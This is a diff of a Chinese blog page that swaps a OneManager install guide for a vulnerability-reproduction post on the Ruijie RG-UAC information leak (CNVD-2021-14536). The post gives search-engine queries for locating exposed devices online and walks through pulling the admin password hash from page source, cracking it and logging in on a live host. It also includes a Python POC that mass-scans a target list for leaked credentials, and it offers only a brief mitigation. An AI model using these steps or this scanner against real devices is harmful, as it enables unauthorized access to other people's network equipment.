@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="宝塔面板安装OneManager, stars">
+    <meta name="keywords" content="锐捷RG-UAC信息泄露漏洞(CNVD-2021-14536), stars">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>宝塔面板安装OneManager | stars</title>
+    <title>锐捷RG-UAC信息泄露漏洞(CNVD-2021-14536) | stars</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -315,7 +315,7 @@
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">宝塔面板安装OneManager</h1>
+                    <h1 class="description center-align post-title">锐捷RG-UAC信息泄露漏洞(CNVD-2021-14536)</h1>
                 </div>
             </div>
         </div>
@@ -432,8 +432,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E7%AC%94%E8%AE%B0/">
-                                <span class="chip bg-color">笔记</span>
+                            <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E9%94%90%E6%8D%B7/">
+                                <span class="chip bg-color">漏洞复现 锐捷</span>
                             </a>
                         
                     </div>
@@ -444,8 +444,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="post-category">
-                                网络安全
+                            <a href="/categories/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/" class="post-category">
+                                网络设备漏洞
                             </a>
                         
                     </div>
@@ -457,14 +457,14 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-03-27
+                    2021-04-05
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-03-27
+                    2021-04-05
                 </div>
                 
 
@@ -478,64 +478,71 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>OneManager-php：Onedrive的列表索引和管理器。可以部署到heroku / SCF / normal空间。</p>
-<h2 id="1、简介"><a href="#1、简介" class="headerlink" title="1、简介"></a>1、简介</h2><p>项目：<a target="_blank" rel="noopener" href="https://github.com/qkqpttgf/OneManager-php">https://github.com/qkqpttgf/OneManager-php</a></p>
-<h2 id="2、准备"><a href="#2、准备" class="headerlink" title="2、准备"></a>2、准备</h2><p>宝塔面板最新版</p>
-<p>NGINX1.18</p>
-<p>PHP5.3</p>
-<h2 id="3-安装"><a href="#3-安装" class="headerlink" title="3.安装"></a>3.安装</h2><h3 id="下载程序"><a href="#下载程序" class="headerlink" title="下载程序"></a>下载程序</h3><p><a target="_blank" rel="noopener" href="https://github.com/qkqpttgf/OneManager-php/archive/master.zip">https://github.com/qkqpttgf/OneManager-php/archive/master.zip</a></p>
-<p>下载到网站根目录，解压，把里面的文件复制到网站根目录即可。之后域名打开访问开始部署。</p>
-<p><img src="https://i.loli.net/2021/03/27/2WgCXQaVtuzIq8h.png" alt="image-20201219113703933"></p>
-<h3 id="选择语言"><a href="#选择语言" class="headerlink" title="选择语言"></a>选择语言</h3><p>点击安装语言，下一步时选择语言</p>
-<p><img src="https://i.loli.net/2021/03/27/8PobG5BiNxyOSTz.png" alt="image-20201219113921329"></p>
-<h3 id="设置管理密码"><a href="#设置管理密码" class="headerlink" title="设置管理密码"></a>设置管理密码</h3><p>确认后，设置管理密码，以及伪静态功能。你需要到根目录的.htaccess文件中复制，网站设置好写入权限。</p>
-<pre class="line-numbers language-none"><code class="language-none"># # Apache
-# # LoadModule rewrite_module modules&#x2F;mod_rewrite.so
-# # AllowOverride All
-RewriteEngine On
-# RewriteCond $1 !^(.well-known)
-RewriteRule ^(.*) index.php?&#x2F;$1 [L]
+                <h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><p>2021年3月8日，锐捷 RG-UAC 统一上网行为管理审计系统存在信息泄露，攻击者通过网页源代码可间接获取管理用户账号密码，导致管理员用户认证信息泄露。</p>
+<h2 id="漏洞修补与防护"><a href="#漏洞修补与防护" class="headerlink" title="漏洞修补与防护"></a>漏洞修补与防护</h2><p>目前，只有临时修复方法：将锐捷 RG-UAC 统一上网行为管理审计系统的后台登陆端口，设置为仅内网访问或者仅管理地址（固定MAC地址）可访问，即可防止入侵。</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>fofa查询</p>
+<pre class="line-numbers language-none"><code class="language-none">title&#x3D;&quot;RG-UAC登陆页面&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://i.loli.net/2021/04/05/a1XoFTxBgdmlfjG.png" alt="image-20210405204054890"></p>
+<p>选择一个可以成功访问系统界面的IP，然后F12查看页面源代码，CTRL + F 搜索password</p>
+<p><img src="https://i.loli.net/2021/04/05/GIo6h7KRBivSt3p.png" alt="image-20210405204612818"></p>
+<p>把密码放入cmd5进行解密处理</p>
+<p><img src="https://i.loli.net/2021/04/05/LSNdoVYHGKO3cPt.png" alt="image-20210405204526168"></p>
+<p>登陆账户访问成功</p>
+<p><img src="https://i.loli.net/2021/04/05/ykEVbBcpIdCKtxs.png" alt="image-20210405204718390"></p>
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>除了使用fofa查询，还可以使用Quake空间测绘</p>
+<p>语法为：</p>
+<pre class="line-numbers language-none"><code class="language-none">title:&quot;RG-UAC登录页面&quot; AND response:&quot;admin&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://i.loli.net/2021/04/05/RIblAGHUQF7oZeK.png" alt="image-20210405205728160"></p>
+<p>验证除了查看源码还可以使用PeiQi大佬编写的POC脚本</p>
+<pre class="line-numbers language-none"><code class="language-none">import requests
+import sys
+import random
+import re
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
-###-----------------------------------
-### nginx
-# rewrite ^&#x2F;(?!.well-known)(.*)$ &#x2F;index.php?&#x2F;$1 last;
-#
-### caddy
-# rewrite &#123;
-#     to index.php?&#x2F;$1
-# &#125;
-#
-### caddy2 Caddyfile
-# @try_files &#123;
-#     not path &#x2F;.well-known&#x2F;*
-#     file &#123;
-#         try_files index.php
-#     &#125;
-# &#125;
-# rewrite @try_files &#123;http.matchers.file.relative&#125;
-#
-###-----------------------------------
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><strong>注意：</strong>请看好自己的web服务器类型，Nginx就复制Nginx的伪静态规则。宝塔面板：网站设置→伪静态。</p>
-<p>确认重写伪静态功能，把以下代码复制到网站设置的伪静态中。代码如下：</p>
-<p><img src="https://i.loli.net/2021/03/27/y6f8VsK1FXLSjDu.png" alt="image-20201219114858162"></p>
-<p>保存，点击确认重写伪静态规则后，开始设置密码</p>
-<p><img src="https://i.loli.net/2021/03/27/rCwN3pq9hxJLodM.png" alt="image-20201219115019433"></p>
-<p>确认后，即安装成功，会自动跳转到首页，可以输入密码登录后台。</p>
-<h3 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h3><p>登录如图：</p>
-<p><img src="https://i.loli.net/2021/03/27/Xp5aHrA4mcSbfdY.png" alt="image-20201219115120435"></p>
-<p>输入刚才创建的密码，登陆成功</p>
-<p><img src="https://i.loli.net/2021/03/27/W7QURf3mgnzPiCj.png" alt="image-20201219115216708"></p>
-<h3 id="后台设置"><a href="#后台设置" class="headerlink" title="后台设置"></a>后台设置</h3><p>点击后台设置，会出现添加onedrive的选项，，也可以设置这题，默认集成了数10款主题，如图：</p>
-<p><img src="https://i.loli.net/2021/03/27/ahWnV5kuiQAPzcX.png" alt="image-20201219122202448"></p>
-<h3 id="添加网盘"><a href="#添加网盘" class="headerlink" title="添加网盘"></a>添加网盘</h3><p>支持国际版（商业版与个人版）、CN: 世纪互联版、ShareUrl: 共享链接。</p>
-<p><img src="https://i.loli.net/2021/03/27/IXadcS7D54wpT6y.png" alt="image-20201219122229163"></p>
-<p>可以自己申请机密和ID，也可用默认的……用默认的方便点，自己申请可能偶尔会出点问题。</p>
-<p><img src="https://i.loli.net/2021/03/27/qHsNQIkWn7e2Uw9.png" alt="image-20201219122255326"></p>
-<p>确认后，会确认授权，确认之后，onedrive即可添加成功，如图：</p>
-<p><img src="宝塔面板安装OneManager.assets/image-20201219122047948.png" alt="image-20201219122047948"></p>
-<h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p>前端的效果还是不错的，集成了14款主题，你可以任意选择，推荐用（nexmoe2.html）主题。效果如图：</p>
-<p><img src="https://i.loli.net/2021/03/27/ZKLCecgslVQDjf2.png" alt="image-20201219122128492"></p>
+def title():
+    print(&#39;+------------------------------------------&#39;)
+    print(&#39;+  \033[34mPOC_Des: http:&#x2F;&#x2F;wiki.peiqi.tech                                   \033[0m&#39;)
+    print(&#39;+  \033[34mGithub : https:&#x2F;&#x2F;github.com&#x2F;PeiQi0                                 \033[0m&#39;)
+    print(&#39;+  \033[34m公众号 : PeiQi文库                                                     \033[0m&#39;)
+    print(&#39;+  \033[34mVersion: 锐捷RG-UAC统一上网行为管理审计系统                             \033[0m&#39;)
+    print(&#39;+  \033[36m使用格式:  python3 poc.py                                            \033[0m&#39;)
+    print(&#39;+  \033[36mFile         &gt;&gt;&gt; ip.txt                             \033[0m&#39;)
+    print(&#39;+------------------------------------------&#39;)
+
+def POC_1(target_url):
+    vuln_url &#x3D; target_url
+    headers &#x3D; &#123;
+        &quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;86.0.4240.111 Safari&#x2F;537.36&quot;,
+    &#125;
+    try:
+        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+        response &#x3D; requests.get(url&#x3D;vuln_url, headers&#x3D;headers, verify&#x3D;False, timeout&#x3D;5)
+        if &quot;super_admin&quot; in response.text and &quot;password&quot; in response.text and response.status_code &#x3D;&#x3D; 200:
+            print(&quot;\033[32m[o] 目标 &#123;&#125;存在漏洞 ,F12查看源码获取密码md5值 \033[0m&quot;.format(target_url))
+        else:
+            print(&quot;\033[31m[x] 目标 &#123;&#125;不存在漏洞 \033[0m&quot;.format(target_url))
+    except Exception as e:
+        print(&quot;\033[31m[x] 目标 &#123;&#125;不存在漏洞 \033[0m&quot;.format(target_url))
+
+def Scan(file_name):
+    with open(file_name, &quot;r&quot;, encoding&#x3D;&#39;utf8&#39;) as scan_url:
+        for url in scan_url:
+            if url[:4] !&#x3D; &quot;http&quot;:
+                url &#x3D; &quot;http:&#x2F;&#x2F;&quot; + url
+            url &#x3D; url.strip(&#39;\n&#39;)
+            try:
+                POC_1(url)
+
+            except Exception as e:
+                print(&quot;\033[31m[x] 请求报错 \033[0m&quot;.format(e))
+                continue
+
+if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
+    title()
+    file_name  &#x3D; str(input(&quot;\033[35mPlease input Attack File\nFile &gt;&gt;&gt; \033[0m&quot;))
+    Scan(file_name)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://i.loli.net/2021/04/05/Ix9RDXCHuOViWQ1.png" alt="image-20210405205705570"></p>
 
             </div>
             <hr/>
@@ -561,7 +568,7 @@ RewriteRule ^(.*) index.php?&#x2F;$1 [L]
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://axingde.github.io/2021/03/27/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF%E5%AE%89%E8%A3%85OneManager/">https://axingde.github.io/2021/03/27/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF%E5%AE%89%E8%A3%85OneManager/</a>
+                    <a href="https://axingde.github.io/2021/04/05/%E9%94%90%E6%8D%B7RG-UAC%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-CNVD-2021-14536/">https://axingde.github.io/2021/04/05/%E9%94%90%E6%8D%B7RG-UAC%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-CNVD-2021-14536/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -599,8 +606,8 @@ RewriteRule ^(.*) index.php?&#x2F;$1 [L]
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E7%AC%94%E8%AE%B0/">
-                                    <span class="chip bg-color">笔记</span>
+                                <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E9%94%90%E6%8D%B7/">
+                                    <span class="chip bg-color">漏洞复现 锐捷</span>
                                 </a>
                             
                         </div>
@@ -771,7 +778,7 @@ RewriteRule ^(.*) index.php?&#x2F;$1 [L]
         repo: '',
         owner: '',
         admin: null,
-        id: '2021-03-27T22-52-27',
+        id: '2021-04-05T21-00-55',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -795,9 +802,10 @@ RewriteRule ^(.*) index.php?&#x2F;$1 [L]
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2021/04/05/%E9%94%90%E6%8D%B7RG-UAC%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-CNVD-2021-14536/">
                     <div class="card-image">
@@ -815,9 +823,9 @@ RewriteRule ^(.*) index.php?&#x2F;$1 [L]
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-04-05
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-04-05
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -830,6 +838,7 @@ RewriteRule ^(.*) index.php?&#x2F;$1 [L]
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -848,13 +857,13 @@ RewriteRule ^(.*) index.php?&#x2F;$1 [L]
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/12/06/AntSword%E5%AE%89%E8%A3%85/">
+                <a href="/2021/03/27/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF%E5%AE%89%E8%A3%85OneManager/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="AntSword安装">
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="宝塔面板安装OneManager">
                         
-                        <span class="card-title">AntSword安装</span>
+                        <span class="card-title">宝塔面板安装OneManager</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -865,7 +874,7 @@ RewriteRule ^(.*) index.php?&#x2F;$1 [L]
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-12-06
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-03-27
                             </span>
                         <span class="publish-author">
                             
@@ -882,8 +891,8 @@ RewriteRule ^(.*) index.php?&#x2F;$1 [L]
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E8%9A%81%E5%89%91/">
-                        <span class="chip bg-color">蚁剑</span>
+                    <a href="/tags/%E7%AC%94%E8%AE%B0/">
+                        <span class="chip bg-color">笔记</span>
                     </a>
                     
                 </div>
